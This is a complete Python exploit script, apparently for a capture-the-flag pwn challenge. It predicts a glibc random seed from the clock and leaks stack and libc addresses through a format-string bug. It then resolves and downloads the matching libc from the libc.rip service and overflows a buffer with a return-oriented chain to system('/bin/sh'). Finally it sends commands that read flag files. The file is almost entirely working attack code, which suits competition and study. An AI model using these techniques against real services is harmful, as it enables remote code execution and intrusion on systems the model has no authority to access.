import time, re, json, os, struct, urllib.request
from lib78 import *
from lib78 import ONE_WAY

CMD = b'cat /flag*;cat /home/*/flag*;cat flag* 2>/dev/null;ls /\n'
CACHE = 'libc_cache'


def align_send(c, data, lo=0.06, hi=0.28):
    while True:
        t = time.time()
        if lo <= (t % 1) <= hi:
            c.send(data)
            return t
        time.sleep(0.006)


def libc_lookup(puts_addr, start_main_ret):
    body = json.dumps({"symbols": {"puts": hex(puts_addr), "__libc_start_main_ret": hex(start_main_ret)}}).encode()
    req = urllib.request.Request('https://libc.rip/api/find', data=body, headers={'Content-Type': 'application/json'})
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.load(r)


def get_libc_file(entry):
    os.makedirs(CACHE, exist_ok=True)
    path = os.path.join(CACHE, entry['id'] + '.so')
    if os.path.exists(path) and os.path.getsize(path) > 100000:
        return open(path, 'rb').read()
    url = entry['download_url']
    req = urllib.request.Request(url, headers={'User-Agent': 'curl/8'})
    with urllib.request.urlopen(req, timeout=120) as r:
        data = r.read()
    open(path, 'wb').write(data)
    return data


def elf_exec_ranges(d):
    e_phoff = struct.unpack_from('<Q', d, 0x20)[0]
    e_phentsize = struct.unpack_from('<H', d, 0x36)[0]
    e_phnum = struct.unpack_from('<H', d, 0x38)[0]
    out = []
    for i in range(e_phnum):
        o = e_phoff + i * e_phentsize
        t, fl = struct.unpack_from('<II', d, o)
        off, va, pa, fs, ms, al = struct.unpack_from('<QQQQQQ', d, o + 8)
        if t == 1 and (fl & 1):
            out.append((off, va, fs))
    return out


def find_pop_rdi(d):
    segs = elf_exec_ranges(d)
    cands = []
    idx = d.find(b'\x5f\xc3')
    while idx != -1:
        for off, va, fs in segs:
            if off <= idx < off + fs:
                cands.append(va + (idx - off))
                break
        idx = d.find(b'\x5f\xc3', idx + 1)
    return cands


def fmt_addr(spec, target):
    b = spec.encode() + b'\x00'
    b += b'\x00' * (16 - len(b))
    return b + p64(target)


def attempt(v=True, align_extra=False):
    c = Conn()
    try:
        c.s.settimeout(3)
        buf = b''
        while buf.count(b'\n') < 2:
            d = c.s.recv(1)
            if not d:
                return None
            buf += d
        T = time.time()
        c.buf = b''
        c.send(str(GlibcRand(int(T - ONE_WAY)).next()).encode() + b'\n')
        out, ok = c.read_until('说出你想要说的话吧'.encode())
        if not ok:
            return None
        t1 = align_send(c, b'%15$p.%17$p\n')
        out, ok = c.read_until('如果只是许愿'.encode())
        m = re.findall(rb'0x[0-9a-f]+', out)
        if len(m) < 2:
            return None
        base = int(m[0], 16) - OFF_RET_MAIN
        libc_ret = int(m[1], 16)
        c.read_until('做你想要做的事吧'.encode())
        c.send(str(GlibcRand(int(t1 + ONE_WAY)).next()).encode() + b'\n')
        out, ok = c.read_until('做你想要做的事吧'.encode())
        if not ok:
            return None

        # 轮1: 泄漏 puts，然后回 get_name
        chain1 = [base + OFF_RET, base + OFF_ECHO, base + OFF_GUESS, base + 0x1428]
        c.send(b'A' * 0x40 + p64(0) + b''.join(p64(x) for x in chain1))
        time.sleep(0.2)
        c.send(fmt_addr('%6$s', base + OFF_PUTS_GOT))
        time.sleep(0.7); c.pull(0.6)
        raw = c.buf
        off = 2 if raw[:2] == b':\n' else 0
        if len(raw) < off + 6:
            return None
        puts_addr = int.from_bytes(raw[off:off + 6], 'little')
        c.buf = raw[off + 6:]
        if not (0x700000000000 < puts_addr < 0x800000000000):
            return None

        res = libc_lookup(puts_addr, libc_ret)
        if not res:
            return None
        entry = res[0]
        libc = get_libc_file(entry)
        sym = entry['symbols']
        libc_base = libc_ret - int(sym['__libc_start_main_ret'], 16)
        system = libc_base + int(sym['system'], 16)
        binsh = libc_base + int(sym['str_bin_sh'], 16)
        pops = find_pop_rdi(libc)
        if not pops:
            if v: print('[!] 找不到 pop rdi')
            return None
        pop_rdi = libc_base + pops[0]
        if v:
            print('  libc=%s base=%#x pop_rdi=%#x(%d个) system=%#x' % (entry['id'], libc_base, pop_rdi, len(pops), system))

        # guess_rand 读数字
        o, ok = c.read_until('做出你的选择吧'.encode(), timeout=4)
        if not ok:
            return None
        c.send(b'1\n')
        time.sleep(0.5); c.pull(0.4); c.buf = b''

        # 轮2: 直接 ROP -> system("/bin/sh")
        chain = [base + OFF_RET, pop_rdi, binsh, system]
        if align_extra:
            chain = [base + OFF_RET, base + OFF_RET, pop_rdi, binsh, system]
        payload = b'C' * 0x40 + p64(0) + b''.join(p64(x) for x in chain)
        c.send(payload)
        time.sleep(1.2); c.pull(0.8)
        if v:
            print('  rop tail:', c.buf[:40])
        c.buf = b''
        c.send(CMD)
        time.sleep(1.5); c.pull(1.2)
        return c.buf
    finally:
        c.close()


if __name__ == '__main__':
    for i in range(25):
        try:
            r = attempt(align_extra=(i % 2 == 1))
        except Exception as e:
            print('err', repr(e)); continue
        if r:
            txt = r.decode('utf-8', 'replace')
            print('尝试 %d:' % i, txt[:400].replace('\n', ' | '))
            if 'HTUCTF' in txt or 'flag{' in txt:
                open('flag.txt', 'w').write(txt)
                print('*** 拿到 flag ***')
                break
